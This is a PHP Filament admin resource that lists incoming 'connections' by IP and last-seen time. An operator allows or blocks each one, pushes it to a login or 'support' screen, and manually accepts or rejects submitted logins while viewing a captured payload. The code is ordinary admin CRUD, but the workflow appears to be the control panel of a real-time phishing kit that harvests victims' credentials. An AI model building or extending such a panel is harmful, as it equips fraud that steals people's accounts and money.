<?php

namespace App\Filament\Resources\Connections;

use App\Connection\Status;
use App\Connection\Step;
use App\Filament\Resources\Connections\Pages\ManageConnections;
use App\Models\Connection;
use BackedEnum;
use Carbon\CarbonImmutable;
use Filament\Actions\Action;
use Filament\Actions\ActionGroup;
use Filament\Actions\BulkActionGroup;
use Filament\Actions\DeleteAction;
use Filament\Actions\DeleteBulkAction;
use Filament\Actions\EditAction;
use Filament\Actions\ViewAction;
use Filament\Forms\Components\TextInput;
use Filament\Infolists;
use Filament\Notifications\Notification;
use Filament\Resources\Resource;
use Filament\Schemas\Components\Grid;
use Filament\Schemas\Schema;
use Filament\Support\Colors\Color;
use Filament\Support\Icons\Heroicon;
use Filament\Tables\Columns\TextColumn;
use Filament\Tables\Table;
use Illuminate\Support\Carbon;

class ConnectionResource extends Resource
{
    protected static ?string $model = Connection::class;

    protected static string|BackedEnum|null $navigationIcon = Heroicon::FingerPrint;

    protected static ?string $recordTitleAttribute = 'name';

    public static function table(Table $table): Table
    {
        return $table
            ->recordTitleAttribute('name')
            ->columns([
                TextColumn::make('name')->searchable(),
                TextColumn::make('status')->label('Status')->badge(),
                TextColumn::make('step')->label('Step')->color('gray')->badge(),
                TextColumn::make('ip')->label('IP Address')->searchable(),
                TextColumn::make('last_seen_at')->label('Last Seen')->since()->tooltip(function (CarbonImmutable $state) {
                    return sprintf('%s (UTC)', $state->format('D, jS M Y \a\t g:i A'));
                }),
            ])
            ->filters([
                //
            ])
            ->recordActions([
                ActionGroup::make([
                    ViewAction::make(),

                    Action::make('allow-connection')
                        ->label('Allow')
                        ->color(Color::Green)
                        ->icon(Heroicon::CheckCircle)
                        ->visible(fn(Connection $record) => $record->status->is([Status::Pending, Status::Blocked]))
                        ->action(function (Action $action, Connection $record) {
                            try {
                                $record->update(['status' => Status::Allowed]);
                            } catch (\Exception $e) {
                                Notification::make()
                                    ->danger()
                                    ->title('Failed to approve connection')
                                    ->body(str($e->getMessage())->limit(50))
                                    ->send();

                                $action->halt();
                            }
                        }),

                    Action::make('block-connection')
                        ->label('Deny')
                        ->color(Color::Red)
                        ->icon(Heroicon::XCircle)
                        ->visible(fn(Connection $record) => $record->status->is([Status::Pending, Status::Allowed]))
                        ->action(function (Action $action, Connection $record) {
                            try {
                                $record->update(['status' => Status::Blocked]);
                            } catch (\Exception $e) {
                                Notification::make()
                                    ->danger()
                                    ->title('Failed to block connection')
                                    ->body(str($e->getMessage())->limit(50))
                                    ->send();

                                $action->halt();
                            }
                        }),

                    ActionGroup::make([
                        Action::make('show-login')
                            ->icon(Heroicon::LockClosed)
                            ->visible(fn(Connection $record) => $record->status->is(Status::Allowed))
                            ->label(function (Connection $record) {
                                return match ($record->step) {
                                    Step::LoginLoading, Step::LoginRejected => 'Reset Login',
                                    default => 'Show Login',
                                };
                            })
                            ->action(fn(Connection $record) => $record->update(['step' => Step::Login])),

                        Action::make('accept-login')
                            ->icon(Heroicon::CheckCircle)
                            ->label('Accept Login')
                            // ->color(Color::Green)
                            ->visible(fn(Connection $record) => $record->step->is(Step::LoginLoading))
                            ->action(fn(Connection $record) => $record->update(['step' => Step::LoginSuccessful])),

                        Action::make('reject-login')
                            ->icon(Heroicon::XCircle)
                            ->label('Reject Login')
                            // ->color(Color::Red)
                            ->visible(fn(Connection $record) => $record->step->is(Step::LoginLoading))
                            ->action(fn(Connection $record) => $record->update(['step' => Step::LoginRejected])),

                        Action::make('show-support')
                            ->icon(Heroicon::ChatBubbleBottomCenterText)
                            ->label('Show Support')
                            ->visible(fn(Connection $record) => $record->status->is(Status::Allowed))
                            ->action(fn(Connection $record) => $record->update(['step' => Step::Support])),
                    ])
                        ->dropdown(false),
                ]),
            ])
            ->poll('3s');
    }

    public static function infolist(Schema $schema): Schema
    {
        return $schema
            ->components([
                Infolists\Components\TextEntry::make('name'),
                Infolists\Components\TextEntry::make('last_seen_at')->label('Last Seen')->since()->tooltip(function (CarbonImmutable $state) {
                    return sprintf('%s (UTC)', $state->format('D, jS M Y \a\t g:i A'));
                }),
                Infolists\Components\KeyValueEntry::make('payload')->columnSpanFull(),
            ])
            ->columns(['lg' => 2]);
    }

    public static function getPages(): array
    {
        return [
            'index' => ManageConnections::route('/'),
        ];
    }
}
